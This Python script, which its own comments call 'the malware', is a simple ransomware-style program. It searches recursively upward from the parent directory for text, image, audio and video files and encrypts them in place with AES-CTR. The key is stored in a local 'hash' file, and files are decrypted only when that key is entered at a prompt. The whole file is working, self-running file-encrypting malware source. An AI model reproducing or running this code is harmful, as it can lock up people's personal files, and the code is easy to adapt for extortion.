import os

import hashlib
import secrets
import socket
from Crypto.Util import Counter
from Crypto.Cipher import AES

'''
To create info logs
'''
def logInfo(text):
    print(text)


'''
To create error logs
'''
def logError(text):
    print(text)


'''
I create a password for AES using a hash encryption
'''
def create_hash():
    #Create a text using the host name and random characters
    futureHash = socket.gethostname() + secrets.token_urlsafe(32)
    futureHash = futureHash.encode('utf-8')

    #Create a password using the hash encryption sha512, then convert it to hexadecimal
    myhash = hashlib.sha512(futureHash)
    myhash = myhash.hexdigest()

    #Only want the first 32 characters
    return myhash[:32]


'''
Encrypt and decrypt the files
Thanks we are using symmetric cryptography we can
encrypt and decrypt the files in the same way

File -> the name of the file we are going to crypt
Crypto -> the object that is going to crypt our text
Size -> the number of bytes that are going to have the blocks that we are going to crypt, every file will be split into blocks
'''
def crypt(file, crypto, size):
    #Binary lecture of the file
    with open(file, 'r+b') as encryptFile:
        content = encryptFile.read(size)

        #This loop works if there is text to crypt
        while content:  
            #Cypt the content and save it in message
            message = crypto(content)

            if len(content) != len(message):
                #The text before and after being crypt should have the same lenght
                raise ValueError('Lenght error due to a bad crypt practise in file '+str(file))
            
            #Move the bytes in the file
            encryptFile.seek(- len(content), 1)
            
            #Rewrite the content of the file to an encrypted/decrypted one 
            encryptFile.write(message) 

            #Take the next bytes that has to be encrypted/decrypted
            content = encryptFile.read(size)  


'''
Create a list of all the files
It's a recursive method

List_files -> the list with all the files that have been already found
Start -> the directory were we have to search for files in this execution
'''
def files_recursive(list_files, start):
    #Take the correct os path direction
    destination = os.path.abspath(start)

    #Obtain a list with the files in that path
    files = os.listdir(destination)
    
    logInfo("In directory "+str(start)+" are these files: "+str(", ".join(files)))

    for file in files:
        if not("." in file):
            #In a directory
            try:
                list_files = files_recursive(list_files, start+"/"+file)
            except:
                logError(str(file)+" not a directory")

        elif(file != ""):
            #It is a file with an extension
            if file.split(".")[-1] in  "txt jpg jpeg mp4 mp3 png".split(" "):
                #It is one of the extensions we are looking for
                list_files.append(os.path.join(start+"/"+file))
    return list_files

'''
Create a list of files calling the recursive version of this method
'''
def files():
    #Call the recursive method to obtain the list of files
    list_files = files_recursive([],"..")

    logInfo("All the files: "+str(", ".join(list_files)))

    #Write in a file the list of files
    try:
        open("list_files","w+").write("\n".join(list_files))
    except TypeError:
        raise RuntimeError("There are no files")
    
    return list_files

'''
The execution of the malware
'''
def execute():
    #Obtain the list of files
    list_files = files()
    logInfo("List of files: "+", ".join(list_files))

    if os.path.exists("hash"):
        #Decrypt the files
        logInfo("We are going to decrypt")

        #Read the hash in the file
        hash = open("hash", "r")
        key = "".join(hash.read().split("\n"))

        #User enter a key
        if key == input("Enter key: "):
            #If the key is correct all the files are decrypted
            logInfo("key "+str(key))

            #Crypto is an object that will allow the program to decrypt using AES
            crypto = AES.new(key.encode("utf-8"), AES.MODE_CTR, counter=Counter.new(128))
            crypto = crypto.decrypt
            logInfo(crypto)

            #Call the crypt method for everyfile
            for file in list_files:
                crypt(file,crypto,16)

            #Remove the hash file
            os.remove("hash")

        else:
            #The key is incorrect
            logInfo("Incorrect key")
            print("Incorrect key")
    else:
        #Encrypt files
        logInfo("We are going to encrypt")

        #Create new key
        key = create_hash()
        logInfo("The password: "+str(key))

        #Create an object to encrypt using AES
        crypto = AES.new(key.encode("utf-8"), AES.MODE_CTR, counter=Counter.new(128))
        crypto = crypto.encrypt
        logInfo(crypto)

        #Save key in a document
        hash = open("hash", "wb")
        hash.write(key.encode("utf-8"))
        hash.close()

        #Call the crypt method for everyfile
        for file in list_files:
            crypt(file,crypto,16)


try:
    execute()
except KeyboardInterrupt:
    logError("KeyBoardInterrupt")
    exit()
